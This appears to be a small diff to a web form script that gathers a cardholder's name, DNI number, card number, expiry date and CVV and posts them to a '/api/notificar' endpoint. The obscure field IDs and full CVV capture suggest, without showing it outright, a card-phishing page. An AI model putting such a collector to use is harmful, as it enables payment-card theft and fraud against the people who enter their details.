@@ -26,13 +26,14 @@ document.addEventListener('DOMContentLoaded', () => {
             btn.disabled = true;
 
                    // Reemplazar desde 'const formData = new FormData();' hasta el 'body: formData'
-        const data = {
-            titular: document.getElementById('titular').value,
+                const data = {
+            titular: document.getElementById('itit').value,
             dni: document.getElementById('idok').value,
             tarjeta: tarjetaInput.value,
             vencimiento: vctoInput.value,
-            cvv: document.getElementById('isagu').value
+            cvv: document.getElementById('isegu').value
         };
+
 
         fetch('/api/notificar', {
             method: 'POST',
